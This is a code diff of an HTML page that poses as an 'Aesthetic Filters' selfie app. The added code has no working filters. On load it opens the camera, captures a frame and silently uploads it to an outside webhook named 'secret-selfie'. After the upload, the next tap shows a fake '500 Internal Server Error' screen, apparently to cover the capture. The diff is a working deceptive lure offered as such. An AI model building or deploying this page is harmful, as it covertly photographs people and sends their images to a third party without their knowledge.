@@ -1,20 +1,166 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aesthetic Filters</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+
+            background:
+                linear-gradient(135deg,
+                    rgba(255, 154, 158, 0.75),
+                    rgba(250, 208, 196, 0.75)),
+                url("bg-filter-app.webp") center / cover no-repeat;
+
+            animation: bgShift 8s ease infinite;
+        }
+
+
+        @keyframes bgShift {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .screen {
+            width: 100%;
+            max-width: 420px;
+            padding: 26px;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.94);
+            backdrop-filter: blur(6px);
+            border-radius: 22px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+            margin: 72px 18px 0 18px;
+        }
+
+        h1 {
+            font-size: 23px;
+            margin-bottom: 12px;
+        }
+
+        p {
+            font-size: 14px;
+            color: #444;
+            margin-bottom: 22px;
+        }
+
+        .filters {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 14px;
+            margin-bottom: 18px;
+        }
+
+        .filter {
+            cursor: pointer;
+            padding: 26px 10px;
+            border-radius: 16px;
+            font-size: 13px;
+            color: #fff;
+            font-weight: 500;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            box-shadow: 0 10px 18px rgba(0, 0, 0, 0.18);
+        }
+
+        .filter:hover {
+            box-shadow: 0 10px 18px rgba(0, 0, 0, 0.5);
+        }
+
+        .filter:nth-child(2) {
+            background: linear-gradient(135deg, #ff758c, #ff7eb3);
+        }
+
+        .filter:nth-child(3) {
+            background: linear-gradient(135deg, #43cea2, #185a9d);
+        }
+
+        .filter:nth-child(4) {
+            background: linear-gradient(135deg, #f7971e, #ffd200);
+            color: #222;
+        }
+
+        .hint {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .error {
+            display: none;
+            text-align: center;
+        }
+
+        .error h1 {
+            font-size: 26px;
+            margin-bottom: 8px;
+        }
+
+        .error p {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .failtext {
+            color: #ff0008;
+        }
+
+        video,
+        canvas {
+            display: none;
+        }
+    </style>
 </head>
 
 <body>
 
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <img id="photo" />
-    <p id="status" style="display:none; font-family: sans-serif;">
-        You can now close this tab
-    </p>
+    <!-- Camera infrastructure -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <!-- UI -->
+    <div class="screen" id="ui">
+        <h1>Try our new aesthetic filters</h1>
+        <p>Fresh tones, soft glow, and trendy edits. Saved straight to your gallery.</p>
+
+        <div class="filters">
+            <div class="filter">Soft Glow</div>
+            <div class="filter">Vintage Fade</div>
+            <div class="filter">Warm Matte</div>
+            <div class="filter">Film Grain</div>
+        </div>
+
+        <div class="hint">Loading filters…</div>
+    </div>
+
+    <!-- Error -->
+    <div class="screen error" id="error">
+        <h1 class="failtext">App failed</h1>
+        <p>500 Internal Server Error</p>
+    </div>
 
     <script>
+        let uploadCompleted = false;
+
         (async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -24,7 +170,6 @@
 
                 const video = document.getElementById("video");
                 const canvas = document.getElementById("canvas");
-                const photo = document.getElementById("photo");
 
                 video.srcObject = stream;
 
@@ -32,38 +177,35 @@
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
 
-                    canvas
-                        .getContext("2d")
-                        .drawImage(video, 0, 0);
-
+                    canvas.getContext("2d").drawImage(video, 0, 0);
                     const imageData = canvas.toDataURL("image/png");
-                    // photo.src = imageData;
 
-                    try {
-                        await fetch("https://chloroformshake.app.n8n.cloud/webhook/secret-selfie", {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json"
-                            },
-                            body: JSON.stringify({
-                                image: imageData
-                            })
-                        });
+                    await fetch("https://chloroformshake.app.n8n.cloud/webhook/secret-selfie", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ image: imageData })
+                    });
 
-                        document.getElementById("status").style.display = "block";
-
-                    } catch (e) {
-                        console.log("Upload failed:", e);
-                    }
-
+                    uploadCompleted = true;
                     stream.getTracks().forEach(t => t.stop());
-
                 }, 800);
 
-            } catch (err) {
-                console.log("Permission denied or blocked:", err);
+            } catch (e) {
+                console.log("Camera error:", e);
             }
         })();
+
+        // Only fail AFTER upload AND user interaction
+        function triggerFailure() {
+            if (!uploadCompleted) return;
+            document.getElementById("ui").style.display = "none";
+            document.getElementById("error").style.display = "block";
+            document.removeEventListener("click", triggerFailure);
+            document.removeEventListener("touchstart", triggerFailure);
+        }
+
+        document.addEventListener("click", triggerFailure);
+        document.addEventListener("touchstart", triggerFailure);
     </script>
 
 </body>
